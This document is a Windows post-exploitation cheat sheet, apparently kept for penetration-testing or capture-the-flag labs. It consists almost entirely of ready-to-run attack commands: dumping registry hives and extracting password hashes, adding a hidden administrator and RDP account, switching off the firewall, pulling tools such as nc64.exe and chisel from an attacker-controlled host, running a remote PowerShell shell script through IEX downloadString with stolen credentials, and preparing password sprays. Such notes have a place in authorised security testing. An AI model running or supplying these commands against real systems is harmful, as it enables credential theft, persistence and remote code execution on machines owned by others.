### Dump hashes
````
reg save hklm\sam .\sam
reg save hklm\system .\system
reg save hklm\security .\security

secretsdump.py -sam sam -system system -security security LOCAL > hashes.txt
````
### Add RDP user
````
net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD
````
### Turn off firewall 
````
NetSh Advfirewall set allprofiles state off
````


#### Ping test blind rce
```sh
C:\Windows\System32\cmd.exe /c ping 10.10.14.27
# on linux box: 
tcpdump -i tun0 icmp
```


#### Ping test blind rce like above check if x64 powershell exists
```sh
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe ping 10.10.14.27
```

#### Download files
```bash
certutil.exe -urlcache -split -f http://10.10.14.10:8000/nc64.exe C:\\Users\\Public\\nc64.exe

powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/
/10.11.0.4/wget.exe','C:\Users\admin\Desktop\wget.exe')"

powershell iwr -uri http://10.10.16.97:8000/chisel.exe -outfile ch.exe # also works in PS ConstrainLanguageMode

expand http://10.10.14.10:8000/watson.exe C:\\Users\\Public\\watson.exe

bitsadmin /transfer debjob /download /priority normal http://10.10.14.10:8000/watson.exe C:\Users\\Public\watson.exe

```

#### md5checksum
```
certutil.exe -hashfile Taihou64.exe MD5
```



#### List directory permissions (win server 2003)
```sh
icacls c:\*. /C
```


#### List alternate data stream files
```sh
dir /r
```

#### Mount windows account share using cifs, "ACCT here is account share name"
```bash
sudo mount -t cifs -o username=Finance //10.1.1.1/ACCT /mnt/win_share/
```

#### Mount vhd file from share
```bash
sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector -ro -v /path/to/mount/directory
```


#### Executing privileged command using valid credentials from powershell
```sh
$username = "Username\Administrator"
$password = "SUPERSECRETPASS"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10:8000/shell.ps1') } -Credential $cred -Computer localhost

or - [BETTER]
$username = "Username\Administrator"
$password = ConvertTo-SecureString -AsPlainText -Force 'SUPERSECRETPASS'
$cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.97:8000/shell.ps1')" -Credential $cred

```


#### Logging into the privileged user account using valid credentials from powershell
```sh
$username = 'Username\Administrator'
$securePassword = ConvertTo-SecureString -AsPlainText -Force 'SUPERSECRETPASS'
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Enter-PSSession -ComputerName localhost -Credential $credential
```


#### Dump password policy to prepare wordlist for password spray if smb null authentication allows domain enumeration.
```sh
crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''
```
#### Check account lock policy before password spraying smb
```bash
crackmapexec smb 10.10.10.123 --pass-pol
```
